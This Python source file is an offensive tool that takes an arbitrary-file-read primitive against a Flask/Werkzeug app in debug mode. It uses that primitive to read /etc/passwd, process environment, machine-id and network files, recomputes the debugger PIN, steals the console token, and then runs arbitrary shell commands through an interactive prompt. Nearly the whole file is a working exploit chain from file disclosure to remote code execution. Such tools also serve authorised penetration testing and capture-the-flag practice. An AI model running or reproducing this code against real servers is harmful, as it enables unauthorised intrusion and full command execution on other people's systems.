import requests
from urllib.parse import urlsplit
import re
import hashlib
from itertools import chain
from bs4 import BeautifulSoup as bs

from prompt_toolkit import PromptSession
from prompt_toolkit.shortcuts import clear

def error(message="", prefix=""):
    print(f"{prefix}[ERROR] {message}")
    exit(1)

def info(message="", prefix=""):
    print(f"{prefix}[INFO] {message}")

class WConsoleExtractor:
    etc_passwd_regex = re.compile(r"(.+):.*:.*:.*:.*:.*:.*")
    modname = "flask.app"
    class_name = "Flask"

    def __init__(self, target:str, leak_function) -> None:
        self.target = target
        if not callable(leak_function):
            error("Your leak function is not callable")

        self.leak_function = leak_function

        # Get base url
        splitted = urlsplit(self.target)
        self.base_url = f"{splitted.scheme}://{splitted.netloc}"
        self.hostname = splitted.hostname

        # Initialize session
        self.sess = requests.Session()

        # Check website is up
        if not self.ping():
            error(f"{self.base_url} does not seem to be up, interrupting...")

        # Check Werkzeug
        server = self.check_werkzeug()
        if not server:
            error(f"Werkzeug not detected in {self.base_url}")

        # Check debug mode activated
        debug_mode, content = self.check_debug_mode()
        if not debug_mode:
            error(f"{self.base_url} does not seem to be in debug mode, interrupting...")
        
        # Check leak file function
        etc_passwd = self.leak_function("/etc/passwd")
        if not etc_passwd or not self.etc_passwd_regex.match(etc_passwd):
            error(f"Your leak function does not seem to work, here is the output when attempting to read /etc/passwd:\n{etc_passwd}")

        e = self.leak_function("/proc/self/environ")
        environ = WConsoleExtractor.parse_environ(e)
        self.username = self.get_username(environ)

        if not self.username:
            info("Unable to find username")
            self.username = self.choose_username(etc_passwd)

        self.python_version = self.get_version(r"Python", server)
        self.werkzeug_version = self.get_version(r"Werkzeug", server)

        self.flask_path = self.get_flask_path(WConsoleExtractor.get_venv(environ))

        if not self.flask_path:
            error("Unable to find flask package name, please report it (https://github.com/Ruulian/wconsole_extractor/issues)")
        
        self.probably_public_bits = [
            self.username, 
            self.modname,
            self.class_name,
            self.flask_path
        ]
        
        # Private bits
        self.machine_id = self.get_machine_id()
        self.uuidnode = self.get_uuid_node()

        self.private_bits = [
            self.uuidnode,
            self.machine_id
        ]

        self.pin_code = self.compute_pin()
        self.token = self.get_token(content)

    @staticmethod
    def parse_environ(environ:str):
        l = environ.split("\0")[:-1]
        env = {}
        for v in l:
            matches = re.findall(r"(.+)=(.*)", v)
            if len(matches) == 0:
                error("Error while parsing environ")
            env[matches[0][0]] = matches[0][1]
        return env

    @staticmethod
    def get_venv(environ:dict) -> bool:
        return environ.get("VIRTUAL_ENV")
    
    @staticmethod
    def get_version(soft, server):
        version = re.findall(soft + r"\/(\d\.\d+)\..*", server)
        if len(version) == 0:
            error(f"{soft} version not found")
        return version[0].strip()
    
    @staticmethod
    def compare_versions(v1:str, v2:str):
        v1_split = v1.split(".")
        v2_split = v2.split(".")

        for i in range(3 - len(v1_split)):
            v1_split.append("0")
        
        for i in range(3 - len(v2_split)):
            v2_split.append("0")

        for i in range(3):
            diff = int(v1_split[i]) - int(v2_split[i])

            if diff > 0:
                return 1
            if diff < 0:
                return -1
        
        return 0

    @staticmethod
    def sanitize_output(output:str):
        return output.replace("\\n", "\n")[2:-1]
            

    def get(self, path:str):
        return self.sess.get(f"{self.base_url}{path}")
    
    def get_headers(self):
        return self.get("/").headers
    
    def ping(self):
        try:
            r = self.get("/")
            return r.status_code
        except:
            return 0
        
    def check_debug_mode(self):
        r = self.get("/console")
        return r.status_code == 200, r.text
    
    def check_werkzeug(self):
        headers = self.get_headers()
        return headers.get("Server")
    
    def print(self, message=""):
        print(message, end="")
    
    # Leaks
    def choose_username(self, etc_passwd:str):
        usernames = []
        for line in etc_passwd.splitlines():
            username = self.etc_passwd_regex.findall(line)[0]
            self.print(f"{len(usernames)} : {username}\n")
            usernames.append(username)

        answer = -1
        while answer < 0 or answer > len(usernames):
            try:
                answer = int(input("Choose the number corresponding to the user that (probably) launched the app > "))
            except ValueError:
                pass

        return usernames[answer]

    def get_username(self, environ:dict) -> str:
        for k, v in environ.items():
            if k == "USERNAME" or k == "USER" or k == "LOGNAME":
                return v
            
            # HOME variable -> parse home dirname
            if k == "HOME":
                if v.startswith("/home/"):
                    return v[6:]
                else:
                    return v[1:]
        
        return ""

    def get_flask_path(self, venv:str) -> str:
        base_version = self.python_version.rsplit(".", 1)[0]
        if venv:
            potential_paths = [
                # pythonX.X
                f"{venv}/lib/python{self.python_version}/site-packages/flask/app.py",
                f"{venv}/lib/python{self.python_version}/dist-packages/flask/app.py",

                # pythonX
                f"/proc/self/cwd/env/lib/python{base_version}/site-packages/flask/app.py",
                f"/proc/self/cwd/env/lib/python{base_version}/dist-packages/flask/app.py",
            ]
        else:
            home_dir = f"/home/{self.username}" if self.username != "root" else "/root"

            potential_paths = [
                # lib
                ## pythonX.X
                f"/usr/local/lib/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/local/lib/python{self.python_version}/dist-packages/flask/app.py",
                f"/usr/lib/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/lib/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{self.python_version}/site-packages/flask/app.py",

                ## pythonX
                f"/usr/local/lib/python{base_version}/site-packages/flask/app.py",
                f"/usr/local/lib/python{base_version}/dist-packages/flask/app.py",
                f"/usr/lib/python{base_version}/site-packages/flask/app.py",
                f"/usr/lib/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib/python{base_version}/site-packages/flask/app.py",

                # lib64
                ## pythonX.X
                f"/usr/local/lib64/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/local/lib64/python{self.python_version}/dist-packages/flask/app.py",
                f"/usr/lib64/python{self.python_version}/site-packages/flask/app.py",
                f"/usr/lib64/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{self.python_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{self.python_version}/site-packages/flask/app.py"

                ## pythonX
                f"/usr/local/lib64/python{base_version}/site-packages/flask/app.py",
                f"/usr/local/lib64/python{base_version}/dist-packages/flask/app.py",
                f"/usr/lib64/python{base_version}/site-packages/flask/app.py",
                f"/usr/lib64/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{base_version}/dist-packages/flask/app.py",
                f"{home_dir}/.local/lib64/python{base_version}/site-packages/flask/app.py",
            ]

        for path in potential_paths:
            r = self.leak_function(path)
            if r != "":
                return path
            
        return ""
    
    def get_machine_id(self):
        value = ""
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id": 
            content = self.leak_function(filename)
            if content == "": continue

            v = content.splitlines()[0].strip()
            
            if v:
                value += v
                break
            
        try:
            content2 = self.leak_function("/proc/self/cgroup")
            value += content2.splitlines()[0].strip().rpartition("/")[2]
        except IndexError:
            pass

        return value
    
    def get_uuid_node(self):
        net_arp = self.leak_function("/proc/net/arp")
        device_line = net_arp.splitlines()[1]
        device_id = device_line.split(" ")[-1]

        mac = self.leak_function(f"/sys/class/net/{device_id}/address")

        matched = re.findall(r"[0-9a-f:]+", mac)

        if len(matched) > 0:
            uuid_node = str(int(matched[0].replace(":", ""), base=16))

        return uuid_node
    
    def compute_pin(self):
        is_v2 = WConsoleExtractor.compare_versions(self.werkzeug_version, "2.0.0") >= 0
        
        if is_v2:
            h = hashlib.sha1()
        else:
            h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
        
        for bit in chain(self.probably_public_bits, self.private_bits):
            if not bit:
                continue
            if isinstance(bit, str):
                bit = bit.encode('utf-8')
            h.update(bit)
        h.update(b'cookiesalt')
        #h.update(b'shittysalt')

        cookie_name = '__wzd' + h.hexdigest()[:20]

        num = None
        if num is None:
            h.update(b'pinsalt')
            num = ('%09d' % int(h.hexdigest(), 16))[:9]

        rv =None
        if rv is None:
            for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                    rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                  for x in range(0, len(num), group_size))
                    break
            else:
                rv = num

        return rv
    
    def get_token(self, token_request_content):
        token = re.findall(r'SECRET = "(.+)";', token_request_content)

        if len(token) == 0:
            error("Error while finding token")

        return token[0]

    def exec_cmd(self, cmd:str):
        argv = cmd.split(' ')

        # Authentication
        authent_path = f"/console?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
        self.get(authent_path)
        
        payload = f"import subprocess; subprocess.Popen({argv}, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()"
        url = f"/console?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
        res = self.get(url)

        if res.status_code == 404:
            error("Error while sending command, please report the issue on tool's repository")
            return
        
        soup = bs(res.text, 'html.parser')
        span = soup.find("span", attrs={"class":"string"})
        traceback = soup.find("div", attrs={"class":"traceback"})

        if span:
            res = span.contents[0]
            extended = span.find("span")
            if extended:
                res += extended.contents[0]
            output = WConsoleExtractor.sanitize_output(res)
        elif traceback:
            err = traceback.find("blockquote")
            output = err.contents[0]
        else:
            output = ""

        return output.strip()

    def shell(self):
        exit_commands = ["exit", "quit", "q"]
        clear_commands = ["clear", "c"]
        session = PromptSession()

        while True:
            try:
                cmd = session.prompt("[SHELL] > ")
                if cmd in exit_commands:
                    raise SystemExit
                if cmd in clear_commands:
                    clear()
                    continue
            except (KeyboardInterrupt, EOFError, SystemExit):
                break
            else:
                output = self.exec_cmd(cmd)
                if output.startswith("FileNotFoundError"):
                    output = f"{cmd}: command not found"
                self.print(f"{output}\n")
        info("Shell terminated")
